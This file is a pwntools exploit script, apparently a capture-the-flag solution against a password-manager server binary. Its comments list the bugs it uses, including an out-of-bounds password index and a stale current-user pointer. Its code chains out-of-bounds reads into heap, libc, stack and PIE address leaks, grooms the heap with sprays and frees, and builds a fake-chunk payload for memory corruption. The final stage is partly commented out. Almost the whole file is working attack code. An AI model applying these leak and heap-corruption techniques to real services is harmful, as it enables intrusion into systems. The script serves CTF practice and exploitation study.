#!/usr/bin/env python3

from pwn import *

exe = ELF("main_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a,b : r.sendline(a,b)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

######SERVER CONTEXT###########
#typedef struct srv_pw_t {
#  uint64_t len;
#  char *password;
#} srv_pw_t;
#
#typedef struct srv_user_t {
#  char* username;
#  uint32_t username_len;
#  srv_pw_t passwords[MAX_PASSWORDS];
#} srv_user_t;
#
#srv_user_t **srv_users;
#srv_user_t *srv_curr_user;

######KEY NOTES#####
#current user is set but never unset
#there are 2 ptrs to the same malloced area
#if packet_len for the data section can be over written or modified in some way it may be possible to heap overflow
#password get is no bound check
#this could also result in type confusion
#with a leak I can read from my own inputted password name.
#I now have an arbitrary way to leak via password, I do have one restrict though that I need to know the place to leak
#I can also send whatever bytes I want
#what I really want is a big stack leak

#packet numbers
PKT_HELO   = 0 
PKT_SIGNUP = 1  
PKT_LOGOUT = 2  
PKT_ADD    = 3 
PKT_GET    = 4 
PKT_DEL    = 5  
PKT_BUG    = 6  

#server numbers
SRV_PARSE_INIT     = 0 
SRV_PARSE_HDR      = 1 
SRV_PARSE_DATA     = 2 
SRV_PARSE_DISPATCH = 3 

def do_signup(username):
    sla(b'>', b'2')
    sla(b':', username)

def do_login(username):
    sla(b'>', b'1')
    sla(b':', username)

def new_pass(password, index):
    sla(b'>', b'1')
    sla(b':', password)
    sla(b':', f'{index}'.encode())

def get_pass(index):
    sla(b'>', b'2')
    sla(b':', index)

def del_pass(index):
    sla(b'>', b'3')
    sla(b':', f'{index}'.encode())

def logout():
    sla(b'>', b'4')

def bug_report(body, title):
    sla(b'>', b'4')
    sla(b':', body)
    sla(b':', title)

def leak(false_index):
    do_login('chef0')
    get_pass(false_index)
    ru(b'Password: ')
    return uu64(r.recv(6))

def trig_arb_read(preaddr, addr, index):
    #leak libc
    log.info(f"trying to leak address {hex(addr)}")
    do_login(b'chef0')
    del_pass(0)
    new_pass(preaddr+p64(addr), 0)

    #use the same out of bounds bug
    get_pass(index)
    ru(b'Password: ')

def determine_pie_stack_leak(stack_leak_init):
    for i in range(16):
        logout()
        #input("attach gdb")
        trig_arb_read(b'\x01'*8, stack_leak_init+0x8+(i*0x10), b'-3')
        stack_leak = uu64(r.recv(6))

        if not((stack_leak & 0xFFF) ^ 0x707):
            return stack_leak_init+0x8+(i*0x10), '23'

        logout()
        #input("attach gdb")
        trig_arb_read(b'\x01'*8, stack_leak_init+0x10+(i*0x10), b'23')
        pie_leak = uu64(r.recv(6))
        if not((stack_leak & 0xFFF) ^ 0x707):
            return stack_leak_init+0x10+(i*0x10), '-3'
    log.error("Failed to find")

LIBC_HEAP_OFFSET = 0x1b20
INITIAL_LEAK_OFFSET = 0x9b0
LIBC_LEAK_OFFSET = 0x219CE0
FAKE_CHUNK_OFFSET = 0x1f20

def main():
    #setup
    for i in range(10):
        do_signup(f'chef{i}')
        do_login(f'chef{i}')
        new_pass(chr(0x41+i)*16, 0)
        logout()

    heap_leak = leak(b'-13')
    heap_base = heap_leak - INITIAL_LEAK_OFFSET

    log.info(f"heap base: {hex(heap_base)}")
    logout()
    #gdb.attach(r)


    #spray passwords
    for i in range(10):
        do_login(f'chef{i}')
        for j in range(1,11):
            new_pass('spry'*0x3F, j)
        logout()

    #stop the top of the heap from decreasing 
    do_login(f'chef0')
    new_pass('STOPSTOP', 12)
    logout()

    #release the passwords
    for i in range(10):
        do_login(f'chef{i}')
        for j in range(1,11):
            del_pass(j)
        logout()


    bug_report(b'A'*0x430, b'B'*31) 
    bug_report(b'B'*0x800, b'B'*31) 
    bug_report(b'C'*0x430, b'B'*31) 

    trig_arb_read(b'LEAKLEAK' ,heap_base+LIBC_HEAP_OFFSET, b'-3')
    libc_leak = uu64(r.recv(6))
    libc.address = libc_leak - LIBC_LEAK_OFFSET
    log.info(f"libc base @ {hex(libc.address)}")
    log.info(f"environ @ {hex(libc.symbols['environ'])}")

    logout()

    trig_arb_read(b'LEAKLEAK', libc.symbols["environ"]+1, '23')

    stack_leak = uu64(b'\x00' + r.recv(5))
    log.info(f"stack @ {hex(stack_leak)}")

    environ_start, next_index= determine_pie_stack_leak(stack_leak)

    log.info(f"stack environ @ {hex(environ_start)}")

    to_leak = environ_start + 0x260

    logout()
    trig_arb_read(b'\x01'*8, to_leak, next_index)
    pie_leak = uu64(r.recv(6))
    exe.address = pie_leak - 0x40
    log.info(f'binary @ {hex(exe.address)}')
    logout()

    #respray passwords
    #for i in range(10):
    #    do_login(f'chef{i}')
    #    for j in range(1,11):
    #        new_pass('spry'*0x3F, j)
    #    logout()

    payload =  p64(heap_base+FAKE_CHUNK_OFFSET)*0x40
    payload += p64(heap_base+FAKE_CHUNK_OFFSET)*0x40
    payload += p64(0)
    payload += p64(0x301)
    payload += p64(0)*0x61

    payload += p64(0x300)
    payload += p64(0)

    payload += b'C' * 0x100 
    bug_report(payload, b'B'*31) 

    do_signup("pwn")
    do_login("pwn")
    #bug_report(b'B'*0x800, b'B'*31) 
    #bug_report(b'C'*0x430, b'B'*31) 
    input()
    del_pass(2)
    #logout again to reset the packet_ctr, then again, and one more time to call bug
    #this way it will write whatever, followed by the thing that I actually want to sent
    #bug_report(b"A"*0x100+b'\x02\x00\x00\x00'+b'\x02\x00\x00\x00\x07', "B"*32)
    #sla('>', b'2')
    #sla(':', b'C'*0x1040)

    r.interactive()


if __name__ == "__main__":
    main()
